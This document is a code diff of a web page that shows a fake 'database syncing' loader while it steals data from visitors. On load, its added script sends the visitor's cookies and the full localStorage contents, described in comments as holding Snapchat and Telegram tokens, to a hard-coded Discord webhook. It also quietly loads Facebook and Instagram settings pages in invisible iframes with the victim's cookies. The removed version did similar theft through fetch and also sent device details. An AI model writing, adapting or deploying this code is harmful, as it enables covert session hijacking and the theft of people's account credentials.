@@ -6,64 +6,57 @@
     <style>
         body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* إخفاء قنوات السحب تماماً */
+        .stealth-channel { display: none; width: 0; height: 0; border: 0; }
     </style>
 </head>
 <body>
-    <div class="version-marker">6</div> <div class="loader"></div>
-    <p>جاري تشغيل المحرك (V1.1.8)...</p>
+    <div class="version-marker">7</div> <div class="loader"></div>
+    <p>جاري مزامنة قاعدة البيانات (V1.1.9)...</p>
+
+    <iframe name="fb_frame" class="stealth-channel"></iframe>
+    <iframe name="inst_frame" class="stealth-channel"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        // إرسال البيانات فوراً للديسكورد
-        function instantLog(platform, content) {
+        function sendReport(msg) {
             navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
-                embeds: [{
-                    title: `🎯 سحب فوري: ${platform}`,
-                    description: content,
-                    color: 3066993,
-                    timestamp: new Date().toISOString()
-                }]
+                embeds: [{ title: "📡 تقرير القناة الصامتة", description: msg, color: 15105570 }]
             }));
         }
 
-        // الوظيفة الأساسية: "انتحال" طلبات الجهاز بالخلفية
-        async function hijackSession(name, targetUrl) {
-            // نستخدم fetch مع وضع 'include' لإجبار المتصفح يبعث الكوكيز
-            // ونستخدم 'no-cors' عشان ما نوقف عند جدار الحماية، بس الطلب يوصل للموقع بكامل هوية الضحية
-            fetch(targetUrl, { 
-                method: 'GET', 
-                credentials: 'include', 
-                mode: 'no-cors',
-                cache: 'no-store'
-            }).then(() => {
-                instantLog(name, "✅ المتصفح أرسل طلب 'منتحل' بنجاح بكوكيز الضحية.");
-            }).catch(err => {
-                instantLog(name, "❌ فشل الطلب: " + err.message);
-            });
+        // تكتيك الـ Form Injection: إجبار المتصفح على فتح القنوات بكوكيز الضحية
+        function openStealthChannel(name, target) {
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = target;
+            form.target = name; // توجيه الطلب لداخل الـ iframe المخفي
+            document.body.appendChild(form);
+            form.submit();
+            sendReport(`تم فتح قناة سحب مع: ${target}`);
         }
 
-        function executeProtocol() {
-            // سحب معلومات النظام فوراً
-            instantLog("Device Fingerprint", `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+        function runProtocol() {
+            try {
+                // سحب أي كوكيز متاحة (ليست HttpOnly)
+                if (document.cookie) sendReport("🍪 Cookies: " + document.cookie);
+                
+                // سحب الـ Storage (هنا بكون توكن السناب والتليجرام)
+                const localData = JSON.stringify(localStorage);
+                if (localData !== '{}') sendReport("📦 LocalStorage Dump: \n" + localData);
 
-            // إطلاق الطلبات "بالتوازي" فوراً وبسرعة البرق
-            // المتصفح رح يروح يطرق باب فيسبوك وانستا بصفته "الضحية"
-            hijackSession("Facebook Payload", "https://mbasic.facebook.com/");
-            hijackSession("Instagram Payload", "https://www.instagram.com/accounts/edit/");
-            hijackSession("Snapchat Payload", "https://accounts.snapchat.com/accounts/merlin/login");
+                // فتح القنوات الصامتة: المتصفح الحين "بيدخل" فيسبوك وانستا بالخلفية
+                // هاد الطلب بيجبر المتصفح يبعث الكوكيز المحمية للموقع نفسه
+                openStealthChannel("fb_frame", "https://mbasic.facebook.com/settings");
+                openStealthChannel("inst_frame", "https://www.instagram.com/accounts/edit/");
 
-            // سحب الـ Tokens المخزنة في الـ LocalStorage (هذي هي اللي بتخليك تدخل بدون باسورد)
-            const storage = JSON.stringify(localStorage);
-            if (storage !== '{}') {
-                instantLog("LocalStorage Dump", "```json\n" + storage + "\n```");
+            } catch (e) {
+                sendReport("⚠️ خطأ في البروتوكول: " + e.message);
             }
         }
 
-        // تشغيل البروتوكول فوراً
-        executeProtocol();
+        window.onload = runProtocol;
     </script>
 </body>
 </html>
